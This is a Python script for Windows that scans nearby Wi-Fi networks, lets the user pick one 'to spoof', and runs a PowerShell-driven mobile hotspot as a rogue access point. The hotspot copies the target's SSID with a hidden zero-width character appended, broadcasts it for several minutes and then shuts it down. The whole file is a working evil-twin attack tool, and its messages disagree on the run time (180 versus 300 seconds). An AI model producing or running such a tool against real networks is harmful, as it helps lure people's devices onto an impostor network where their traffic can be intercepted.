import subprocess
import time
import pywifi
import sys

def scan_networks():
    print("Forcing active hardware scan...")
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0] 
    iface.scan() 
    time.sleep(5) 
    results = iface.scan_results()
    return list(set(network.ssid for network in results if network.ssid))

def start_rogue_ap(ssid, password="Password123!"):
    ps_command = f"""
    [Windows.System.UserProfile.LockScreen,Windows.System.UserProfile,ContentType=WindowsRuntime] | Out-Null;
    $profile = [Windows.Networking.Connectivity.NetworkInformation, Windows.Networking.Connectivity, ContentType = WindowsRuntime]::GetInternetConnectionProfile();
    $manager = [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager, Windows.Networking.NetworkOperators, ContentType = WindowsRuntime]::CreateFromConnectionProfile($profile);
    
    $config = $manager.GetCurrentAccessPointConfiguration();
    $config.Ssid = "{ssid}";
    $config.Passphrase = "{password}";
    
    $manager.ConfigureAccessPointAsync($config);
    Start-Sleep -Seconds 2; 
    $manager.StartTetheringAsync();
    """
    subprocess.run(["powershell", "-Command", ps_command], capture_output=True)

def stop_rogue_ap():
    print("\n[!] Shutting down Hotspot...")
    ps_command = """
    $profile = [Windows.Networking.Connectivity.NetworkInformation, Windows.Networking.Connectivity, ContentType = WindowsRuntime]::GetInternetConnectionProfile();
    $manager = [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager, Windows.Networking.NetworkOperators, ContentType = WindowsRuntime]::CreateFromConnectionProfile($profile);
    $manager.StopTetheringAsync();
    """
    subprocess.run(["powershell", "-Command", ps_command], capture_output=True)
    print("[+] Hotspot is now OFF.")

def get_hotspot_bssid():
    ps_command = "(Get-NetAdapter -IncludeHidden | Where-Object { $_.InterfaceDescription -match 'Virtual|Direct' } | Select-Object -First 1).MacAddress"
    result = subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
    mac = result.stdout.strip()
    return mac.replace('-', ':').lower() if mac else "Could not retrieve MAC"

if __name__ == "__main__":
    try:
        networks = scan_networks()
        if not networks:
            print("No networks found.")
            sys.exit()
            
        print("\n--- Available Networks ---")
        for i, ssid in enumerate(networks):
            print(f"{i + 1}. {ssid}")
            
        choice = int(input("\nSelect the network number to spoof: ")) - 1
        target_ssid = networks[choice]
        spoofed_ssid = target_ssid + "\u200B"
        
        print(f"\nDynamically updating Hotspot config to '{target_ssid}'...")
        start_rogue_ap(spoofed_ssid)
        
        time.sleep(6) 
        bssid = get_hotspot_bssid()
        
        print(f"\nBroadcasting Rogue AP!")
        print(f"SSID: {target_ssid} (Invisible char appended)")
        print(f"BSSID (MAC): {bssid}")
        print("Running for 180 seconds... (Press Ctrl+C to stop early)")
        
        # Countdown timer that can be interrupted
        for i in range(300, 0, -1):
            print(f"Time remaining: {i}s ", end="\r")
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Manual interruption detected.")
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
    finally:
        # This always runs, ensuring the hotspot doesn't stay on
        stop_rogue_ap()
        print("Cleanup complete.")